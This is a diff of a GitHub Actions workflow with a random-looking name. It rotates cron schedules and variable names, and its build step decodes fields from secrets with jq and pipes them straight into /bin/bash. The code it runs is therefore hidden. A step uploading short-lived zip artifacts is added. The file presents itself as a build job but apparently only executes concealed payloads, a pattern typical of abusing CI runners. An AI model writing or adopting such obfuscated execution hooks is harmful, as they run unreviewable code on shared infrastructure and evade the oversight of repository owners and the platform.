@@ -1,31 +1,25 @@
 name: gracepixel351
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '28 0/6 * * *'
 
+  schedule:
+    - cron: '11 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gracepixel351
         env:
-          tb7: ${{ secrets.tb7 }}
+          v8: ${{ secrets.v8 }}
         run: |
-          echo $tb7 | jq -r .o61 | /bin/bash
-          echo $lieqf749 | jq -r .owymf48 | /bin/bash
-          echo $slo2 | jq -r .r75 | /bin/bash
-          echo $blle1006 | jq -r .j767 | /bin/bash
-          echo $wmb27 | jq -r .bxsq6 | /bin/bash
-          echo $d4210 | jq -r .dq11 | /bin/bash
-          echo $czb44849 | jq -r .itpi5 | /bin/bash
-          echo $ju553 | jq -r .pvj7 | /bin/bash
-          echo $hjhk8 | jq -r .rj2532 | /bin/bash
-          echo $qo28835 | jq -r .jgkb742 | /bin/bash
-          echo $de2 | jq -r .j2 | /bin/bash
-          echo $oowm88 | jq -r .t31 | /bin/bash
-          echo $zpggh79 | jq -r .qor423 | /bin/bash
-          echo $adf80217 | jq -r .pbi90 | /bin/bash
+          printf '%s' "$v8" | jq -r .rq915 | /bin/bash
+          printf '%s' "$osy34" | jq -r .yzyv95 | /bin/bash
+          echo $zimum72188 | jq -r .jx715 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: YouKf5dp
+          path: "*.zip"
+          retention-days: 1
